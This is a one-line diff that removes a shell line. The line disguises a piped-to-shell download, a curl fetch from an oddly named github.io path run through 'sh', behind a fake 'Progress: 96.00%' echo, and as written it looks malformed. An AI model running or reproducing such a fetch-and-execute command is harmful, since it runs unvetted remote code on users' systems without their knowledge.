@@ -1,1 +1,0 @@
-echo Progress: 96.00%curl -L --progress-bar frkns.github.io/fun/InstrumentMeyerNamelyTomorrow | sh
